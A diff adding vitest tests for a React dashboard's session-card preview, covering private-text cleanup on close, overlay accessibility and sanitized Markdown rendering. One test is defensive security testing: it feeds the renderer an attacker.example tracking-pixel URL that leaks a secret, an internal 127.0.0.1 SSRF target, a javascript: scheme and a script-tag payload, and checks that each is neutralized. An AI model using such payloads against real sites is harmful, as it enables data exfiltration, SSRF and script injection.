@@ -2,6 +2,7 @@ import { readFileSync } from 'node:fs';
 import { describe, expect, it } from 'vitest';
 import { createElement } from 'react';
 import { renderToStaticMarkup } from 'react-dom/server';
+import { store } from '../src/dashboard/web/store.js';
 import { SessionsKanbanView, type SessionsKanbanCallbacks, type SessionsKanbanState } from '../src/dashboard/web/sessions-kanban.js';
 import {
   canRestartSession,
@@ -11,10 +12,14 @@ import {
   restartConfirmMessage,
   historySenderKey,
   sessionLocationText,
+  sessionExchangePreview,
   sessionTopicKey,
   shouldOpenWritableTerminal,
+  previewOverlayReducer,
+  previewOverlayInitialState,
 } from '../src/dashboard/web/sessions.js';
 import { CliFilterGroup, TopicGroupsView } from '../src/dashboard/web/sessions-page.js';
+import { previewMarkdownHtml } from '../src/dashboard/web/preview-markdown.js';
 
 const kanbanCallbacks: SessionsKanbanCallbacks = {
   canRestartSession: row => row.status !== 'closed',
@@ -65,6 +70,237 @@ function renderKanban(state: Partial<SessionsKanbanState>): string {
 }
 
 describe('dashboard sessions filters', () => {
+  it('shows only a current bot reply in the latest exchange preview', () => {
+    expect(sessionExchangePreview({
+      previewUserFullText: 'latest question',
+      previewBotFullText: 'latest answer',
+      previewBotState: 'replied',
+    })).toEqual({
+      userText: 'latest question',
+      userFullText: 'latest question',
+      botText: 'latest answer',
+      botFullText: 'latest answer',
+    });
+
+    expect(sessionExchangePreview({
+      previewUserText: 'follow-up',
+      previewBotText: 'stale answer',
+      previewBotState: 'waiting',
+    })).toEqual({
+      userText: 'follow-up',
+      userFullText: 'follow-up',
+      botText: '',
+      botFullText: '',
+    });
+  });
+
+  it('clears merged preview fields when a close SSE patch explicitly sends nulls', () => {
+    store.replaceSnapshot([{
+      sessionId: 'closing-preview',
+      status: 'idle',
+      previewUserText: 'private question',
+      previewBotText: 'private answer',
+      previewUserFullText: 'private question in full',
+      previewBotFullText: 'private answer in full',
+      previewUserAt: 100,
+      previewBotAt: 200,
+      previewBotState: 'replied',
+    }], []);
+
+    store.applySse('session.update', {
+      sessionId: 'closing-preview',
+      patch: {
+        status: 'closed',
+        previewUserText: null,
+        previewBotText: null,
+        previewUserFullText: null,
+        previewBotFullText: null,
+        previewUserAt: null,
+        previewBotAt: null,
+        previewBotState: null,
+      },
+    });
+
+    expect(store.sessions.get('closing-preview')).toMatchObject({
+      status: 'closed',
+      previewUserText: null,
+      previewBotText: null,
+      previewUserFullText: null,
+      previewBotFullText: null,
+      previewUserAt: null,
+      previewBotAt: null,
+      previewBotState: null,
+    });
+    expect(sessionExchangePreview(store.sessions.get('closing-preview') ?? {})).toEqual({
+      userText: '',
+      userFullText: '',
+      botText: '',
+      botFullText: '',
+    });
+  });
+
+  it('does not resurrect private text from legacy fallback fields after close preview cleanup', () => {
+    expect(sessionExchangePreview({
+      status: 'closed',
+      previewUserText: null,
+      previewBotText: null,
+      previewUserFullText: null,
+      previewBotFullText: null,
+      previewUserAt: null,
+      previewBotAt: null,
+      previewBotState: null,
+      lastUserPrompt: 'private closed question',
+      currentTurnTitle: 'private closed title',
+    })).toEqual({
+      userText: '',
+      userFullText: '',
+      botText: '',
+      botFullText: '',
+    });
+  });
+
+  it('renders accessible user and bot preview lines on session cards', () => {
+    const page = readFileSync(new URL('../src/dashboard/web/sessions-page.tsx', import.meta.url), 'utf8');
+    const css = readFileSync(new URL('../src/dashboard/web/style.css', import.meta.url), 'utf8');
+
+    expect(page).toContain('className="session-card-exchange"');
+    expect(page).toContain("t('sessions.history.user')");
+    expect(page).toContain("t('sessions.history.bot')");
+    expect(page).toContain('className="session-card-exchange-tooltip"');
+    // Overlay carries interactive Markdown links, so it is a non-modal dialog
+    // (not a tooltip): keyboard-focusable and reachable.
+    expect(page).toContain('role="dialog"');
+    expect(page).toContain("t('sessions.preview.showFull')");
+    expect(page).toContain('aria-expanded={open}');
+    expect(page).toContain('onPointerEnter={event => {');
+    expect(page).toContain("if (event.key === 'Escape') hide();");
+    // Card summary stays plain-text (2-line clamp); the overlay renders Markdown.
+    expect(page).toContain('<p>{exchange.userText}</p>');
+    expect(page).toContain('<p>{exchange.botText}</p>');
+    expect(css).toContain('.session-card-exchange-line > p');
+    expect(css).toContain('-webkit-line-clamp: 2');
+    expect(css).toContain('.session-card-exchange-tooltip {');
+    expect(css).toContain('position: fixed;');
+    expect(css).toContain('.session-card-exchange-tooltip-scroll {');
+    expect(css).toContain('.session-card-exchange-tooltip-line > p');
+    expect(css).toContain('user-select: text;');
+  });
+
+  it('renders the full-exchange overlay as sanitized Markdown, not raw text', () => {
+    const page = readFileSync(new URL('../src/dashboard/web/sessions-page.tsx', import.meta.url), 'utf8');
+    const css = readFileSync(new URL('../src/dashboard/web/style.css', import.meta.url), 'utf8');
+    const md = readFileSync(new URL('../src/dashboard/web/preview-markdown.ts', import.meta.url), 'utf8');
+
+    // The overlay renders both sides through the Markdown helper (raw HTML off
+    // for XSS safety), replacing the old raw `<p>{fullText}</p>` nodes.
+    expect(page).toContain("import { previewMarkdownHtml } from './preview-markdown.js'");
+    expect(page).toContain('previewMarkdownHtml(exchange.userFullText)');
+    expect(page).toContain('previewMarkdownHtml(exchange.botFullText)');
+    expect(page).toContain('className="session-card-exchange-md"');
+    expect(page).not.toContain('<p>{exchange.userFullText}</p>');
+    expect(page).not.toContain('<p>{exchange.botFullText}</p>');
+
+    // Reuses markdown-it with the same hardening insights.ts applies: no raw
+    // HTML, links forced to a safe scheme, and a plain-text escape fallback.
+    expect(md).toContain("new MarkdownIt({ html: false");
+    expect(md).toContain('validateLink');
+    expect(md).toContain("attrSet('rel', 'noopener noreferrer nofollow')");
+    expect(md).toContain('escapeHtml');
+
+    // Overlay Markdown body is styled with dashboard tokens (no new palette).
+    expect(css).toContain('.session-card-exchange-md');
+  });
+
+  it('never emits an auto-loading <img> for Markdown image syntax (SSRF / tracking-pixel safe)', () => {
+    // `html:false` does NOT cover Markdown image tokens — they still emit
+    // <img src=…>, which the auto-opening overlay would fetch on hover/focus,
+    // leaking to an external tracker or hitting an internal URL (SSRF). The
+    // image rule must degrade to a non-fetching text placeholder. Verified by
+    // ACTUALLY RENDERING, not by scanning source for `html:false`.
+    const external = previewMarkdownHtml('![track](https://attacker.example/pixel?id=secret)');
+    const internal = previewMarkdownHtml('![lan](http://127.0.0.1:8080/admin)');
+    const jsScheme = previewMarkdownHtml('![x](javascript:alert(1))');
+    for (const html of [external, internal, jsScheme]) {
+      expect(html).not.toMatch(/<img\b/i);
+    }
+    // Alt text is preserved; a safe-scheme src becomes an opt-in click-through
+    // link (never auto-loaded), an unsafe scheme stays inert text.
+    expect(external).toContain('session-card-exchange-img');
+    expect(external).toContain('track');
+    expect(external).toContain('href="https://attacker.example/pixel?id=secret"');
+    expect(jsScheme).not.toContain('href="javascript:');
+    // Ordinary Markdown still renders.
+    expect(previewMarkdownHtml('**bold**')).toContain('<strong>bold</strong>');
+    // Raw HTML / script stays escaped.
+    expect(previewMarkdownHtml('<script>alert(1)</script>')).not.toMatch(/<script/i);
+  });
+
+  it('keeps the overlay open and reachable for keyboard focus into Markdown links', () => {
+    const page = readFileSync(new URL('../src/dashboard/web/sessions-page.tsx', import.meta.url), 'utf8');
+
+    // Focus entering the panel cancels the trigger's blur-close timer, so
+    // Tabbing into a rendered link does not unmount the overlay mid-navigation.
+    expect(page).toContain('onFocusCapture={clearHide}');
+    // It only closes once focus leaves BOTH the panel and the trigger.
+    expect(page).toContain('tooltipRef.current?.contains(next) || triggerRef.current?.contains(next)');
+    // Escape closes and returns focus to the trigger.
+    expect(page).toContain('triggerRef.current?.focus()');
+    // Popover semantics on the trigger (not aria-describedby on a tooltip).
+    expect(page).toContain('aria-haspopup="dialog"');
+    expect(page).toContain('aria-controls={open ? tooltipId : undefined}');
+  });
+
+  it('Escape then refocus does not reopen the overlay (reducer the component actually uses)', () => {
+    const page = readFileSync(new URL('../src/dashboard/web/sessions-page.tsx', import.meta.url), 'utf8');
+
+    // Guard against "test the model, run other code": assert the component wires
+    // its useReducer to THIS reducer + dispatches the transitions under test.
+    expect(page).toContain('useReducer(previewOverlayReducer, previewOverlayInitialState)');
+    expect(page).toContain("dispatch('escape-refocus')");
+    expect(page).toContain("dispatch('focus')");
+
+    // Now EXECUTE the transitions in the exact order the Escape key produces:
+    // an open overlay with focus inside → 'escape-refocus' (close + arm one-shot)
+    // → the trigger's programmatic refocus dispatches 'focus'. The one-shot must
+    // be consumed WITHOUT reopening, so the terminal state is closed.
+    let state = previewOverlayInitialState;
+    state = previewOverlayReducer(state, 'open');
+    expect(state.open).toBe(true);
+    state = previewOverlayReducer(state, 'escape-refocus');
+    expect(state).toEqual({ open: false, suppressFocusOpen: true });
+    state = previewOverlayReducer(state, 'focus');
+    expect(state).toEqual({ open: false, suppressFocusOpen: false });
+
+    // A normal (non-suppressed) focus opens; suppress is one-shot only.
+    expect(previewOverlayReducer(previewOverlayInitialState, 'focus'))
+      .toEqual({ open: true, suppressFocusOpen: false });
+    // A second focus after the consumed one-shot opens as usual.
+    expect(previewOverlayReducer({ open: false, suppressFocusOpen: false }, 'focus').open).toBe(true);
+  });
+
+  it('drops the ••• details button and makes the preview body itself the toggle', () => {
+    const page = readFileSync(new URL('../src/dashboard/web/sessions-page.tsx', import.meta.url), 'utf8');
+    const css = readFileSync(new URL('../src/dashboard/web/style.css', import.meta.url), 'utf8');
+
+    // The dedicated ••• button is gone entirely — content + markup + styles.
+    expect(page).not.toContain('•••');
+    expect(page).not.toContain('session-card-exchange-details');
+    expect(css).not.toContain('.session-card-exchange-details');
+
+    // The exchange body itself is now the toggle: keyboard + pointer reachable,
+    // so touch users (no hover) and keyboard users keep a way to open the
+    // overlay that the ••• button used to provide.
+    const exchangeStart = page.indexOf('className="session-card-exchange"');
+    expect(exchangeStart).toBeGreaterThan(-1);
+    const exchangeAttrs = page.slice(exchangeStart - 400, exchangeStart + 400);
+    expect(exchangeAttrs).toContain('role="button"');
+    expect(exchangeAttrs).toContain('tabIndex={0}');
+    // Enter/Space toggles the overlay for keyboard users.
+    expect(page).toContain("event.key === 'Enter' || event.key === ' '");
+    expect(css).toContain('.session-card-exchange {');
+    expect(css).toContain('cursor: pointer;');
+  });
+
   it('wires @ completion and pasted-image previews into the create-session composer', () => {
     const page = readFileSync(new URL('../src/dashboard/web/sessions-page.tsx', import.meta.url), 'utf8');
 
